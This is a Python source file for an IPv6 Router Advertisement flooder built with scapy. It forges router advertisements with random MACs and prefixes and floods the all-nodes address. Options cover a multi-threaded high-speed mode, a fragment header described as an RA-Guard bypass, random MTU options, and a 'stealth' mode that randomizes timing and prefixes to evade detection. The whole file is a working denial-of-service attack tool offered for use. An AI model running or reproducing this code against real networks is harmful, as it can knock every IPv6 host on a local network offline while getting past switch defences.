#!/usr/bin/env python3
"""
IPv6 Router‑Advertisement Flooder
---------------------------------
* Default mode  : single‑thread loop, fresh RA each time
* --fast        : multi‑thread high‑speed mode
* --fragment    : wrap RA in an IPv6 Fragment header (RA‑Guard bypass)
* --random-mtu  : append MTU option with random 1280‑9000
* --capture     : capture and analyze network traffic during attack
* --stealth     : randomized timing patterns for evasion
"""

import argparse, logging, random, signal, threading, time, sys
from tqdm import tqdm
from scapy.all import (
    Ether, IPv6,
    IPv6ExtHdrFragment,                 # ← fragment headers
    ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptMTU,                     # ← MTU options
    sendp, conf
)
from utils import random_mac, mac_to_link_local

# Import optional modules
try:
    from network_discovery import get_default_interface, validate_interface, print_interface_info
    HAS_NETWORK_DISCOVERY = True
except ImportError:
    HAS_NETWORK_DISCOVERY = False

try:
    from capture import create_capture_session
    HAS_CAPTURE = True
except ImportError:
    HAS_CAPTURE = False


# ----------------------------------------------------------------------
def build_ra(use_fragment=False, use_mtu=False, stealth_mode=False):
    """Build one forged RA.  Options: Fragment header, random‑MTU option, stealth timing."""
    src_mac = random_mac()
    dst_mac = "33:33:00:00:00:01"
    src_ll  = mac_to_link_local(src_mac)
    dst_ip  = "ff02::1"

    # Randomize RA parameters for stealth mode
    if stealth_mode:
        router_lifetime = random.randint(0, 1800)  # 0-30 minutes
        reachable_time = random.randint(0, 3600000)  # 0-1 hour in ms
        retrans_timer = random.randint(0, 4294967295)  # Random retrans timer
    else:
        router_lifetime = 0
        reachable_time = 0
        retrans_timer = 0

    ra_hdr = ICMPv6ND_RA(chlim=64, H=1, routerlifetime=router_lifetime,
                         reachabletime=reachable_time, retranstimer=retrans_timer)
    
    # Generate random IPv6 prefix (more realistic ranges for stealth)
    if stealth_mode:
        # Use more common prefixes to blend in
        prefix_choices = [
            f"2001:{random.randint(0,0xffff):x}::",
            f"2001:db8:{random.randint(0,0xffff):x}::",  # Documentation prefix
            f"fd{random.randint(0,0xff):02x}:{random.randint(0,0xffff):x}::",  # ULA
        ]
        prefix = random.choice(prefix_choices)
    else:
        prefix = f"2001:{random.randint(0,0xffff):x}::"
    
    prefix_opt = ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
                                       validlifetime=0xffffffff,
                                       preferredlifetime=0xffffffff,
                                       prefix=prefix)

    pkt = Ether(dst=dst_mac, src=src_mac)/IPv6(src=src_ll, dst=dst_ip)
    if use_fragment:
        pkt /= IPv6ExtHdrFragment()      # RA‑Guard bypass
    pkt /= ra_hdr / prefix_opt

    if use_mtu:
        mtu_opt = ICMPv6NDOptMTU(mtu=random.randint(1280, 9000))
        pkt /= mtu_opt

    return pkt


# ----------------------------------------------------------------------
def flood_loop(args):
    sent, stop = 0, False
    capture_session = None

    def sigint(*_):
        nonlocal stop
        stop = True
        if capture_session:
            capture_session.stop_capture()
    signal.signal(signal.SIGINT, sigint)

    # Start packet capture if requested
    if args.capture and HAS_CAPTURE:
        capture_session = create_capture_session(args.iface, enable_impact_assessment=True)
        capture_session.start_capture()

    bar = tqdm(total=args.count if args.count else None,
               unit="pkt", desc="RA flood", colour="green")

    while not stop and (args.count == 0 or sent < args.count):
        # Build packet with stealth mode if enabled
        pkt = build_ra(args.fragment, args.random_mtu, args.stealth)
        
        try:
            sendp(pkt, iface=args.iface, verbose=False)
            sent += 1
            bar.update(1)
        except Exception as e:
            if "Operation not permitted" in str(e):
                print(f"\n[-] Error: {e}")
                print("[-] Root privileges required for raw packet sending")
                print("[-] Try: sudo python src/ra_flood.py [options]")
                break
            else:
                print(f"[-] Packet send error: {e}")
        
        # Stealth mode: randomized delays (only if stealth enabled)
        if args.stealth:
            delay = random.uniform(0.01, 0.1)  # Faster random delays 0.01-0.1 seconds
            time.sleep(delay)
        # No rate limiting for maximum performance - remove sleep throttling

    bar.close()
    
    # Stop capture and show results
    if capture_session:
        capture_session.stop_capture()
        if hasattr(capture_session, 'impact_assessor'):
            capture_session.impact_assessor.analyze_impact(capture_session.stats)
    
    print(f"[+] Finished – {sent} packets sent")


# ----------------------------------------------------------------------
def flood_fast(args):
    sent           = 0
    stop_evt       = threading.Event()
    capture_session = None

    # Start packet capture if requested
    if args.capture and HAS_CAPTURE:
        capture_session = create_capture_session(args.iface, enable_impact_assessment=True)
        capture_session.start_capture()

    def worker():
        nonlocal sent
        while not stop_evt.is_set() and (args.count == 0 or sent < args.count):
            # Generate fresh packet for each thread if not stealth mode
            if args.stealth:
                pkt = build_ra(args.fragment, args.random_mtu, args.stealth)
            else:
                pkt = build_ra(args.fragment, args.random_mtu, False)
            
            try:
                sendp(pkt, iface=args.iface, verbose=False)
                sent += 1
            except Exception as e:
                if "Operation not permitted" in str(e):
                    print(f"\n[-] Error: {e}")
                    print("[-] Root privileges required for raw packet sending")
                    stop_evt.set()
                    break
            
            # Apply stealth delays only if stealth mode enabled
            if args.stealth:
                delay = random.uniform(0.001, 0.05)  # Very fast random delays in fast mode
                time.sleep(delay)
            # No rate limiting for maximum performance - remove sleep throttling

    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(args.threads)]
    for w in workers:
        w.start()

    bar = tqdm(total=args.count if args.count else None,
               unit="pkt", desc=f"RA flood x{args.threads}", colour="cyan")

    try:
        while not stop_evt.is_set() and (args.count == 0 or sent < args.count):
            bar.n = sent
            bar.refresh()
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_evt.set()

    for w in workers:
        w.join()
    bar.n = sent
    bar.refresh(); bar.close()
    
    # Stop capture and show results
    if capture_session:
        capture_session.stop_capture()
        if hasattr(capture_session, 'impact_assessor'):
            capture_session.impact_assessor.analyze_impact(capture_session.stats)
    
    print(f"[+] Finished – {sent} packets sent")


# ----------------------------------------------------------------------
def main():
    p = argparse.ArgumentParser("IPv6 Router‑Advertisement flooder")
    p.add_argument("-i","--iface", default=None, help="Network interface")
    p.add_argument("-r","--rate",   type=int, default=0, help="pps per thread")
    p.add_argument("-c","--count",  type=int, default=0, help="0 = infinite")
    p.add_argument("--fast",   action="store_true", help="multi‑thread mode")
    p.add_argument("--threads", type=int, default=4,
                   help="worker count for --fast")
    p.add_argument("--fragment",   action="store_true",
                   help="add IPv6 Fragment header (RA‑Guard bypass)")
    p.add_argument("--random-mtu", action="store_true",
                   help="append MTU option with random size")
    p.add_argument("--capture", action="store_true",
                   help="capture and analyze network traffic")
    p.add_argument("--stealth", action="store_true",
                   help="stealth mode with randomized patterns")
    p.add_argument("--list-interfaces", action="store_true",
                   help="list available network interfaces")
    args = p.parse_args()

    # List interfaces and exit
    if args.list_interfaces:
        if HAS_NETWORK_DISCOVERY:
            print_interface_info()
        else:
            print("Network discovery module not available")
            print("Install dependencies: pip install psutil netifaces")
        return

    # Auto-detect interface if not specified
    if not args.iface:
        if HAS_NETWORK_DISCOVERY:
            args.iface = get_default_interface()
            if args.iface:
                print(f"[+] Auto-detected interface: {args.iface}")
            else:
                print("[-] No suitable interface found")
                print("[-] Use --list-interfaces to see available options")
                return
        else:
            args.iface = "eno1"  # Default fallback
            print(f"[!] Using default interface: {args.iface}")

    # Validate interface
    if HAS_NETWORK_DISCOVERY:
        if not validate_interface(args.iface):
            return

    # Check for capture capability
    if args.capture and not HAS_CAPTURE:
        print("[-] Packet capture not available")
        print("[-] Install dependencies: pip install psutil netifaces")
        args.capture = False

    # Warning about required privileges
    if not args.capture:  # Only show if not already shown by capture module
        print(f"[!] Starting RA flood on interface: {args.iface}")
        print("[!] Root privileges required for packet sending")

    # Show configuration
    print(f"[+] Configuration:")
    print(f"    Interface: {args.iface}")
    print(f"    Mode: {'Multi-threaded' if args.fast else 'Single-threaded'}")
    if args.fast:
        print(f"    Threads: {args.threads}")
    print(f"    Rate limit: {args.rate if args.rate else 'Unlimited'} pps")
    print(f"    Count: {args.count if args.count else 'Infinite'}")
    print(f"    Fragment header: {args.fragment}")
    print(f"    Random MTU: {args.random_mtu}")
    print(f"    Stealth mode: {args.stealth}")
    print(f"    Packet capture: {args.capture}")

    try:
        if args.fast:
            flood_fast(args)
        else:
            flood_loop(args)
    except KeyboardInterrupt:
        print("\n[+] Attack interrupted by user")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format="%(levelname)s: %(message)s")
    conf.iface6 = None
    main()
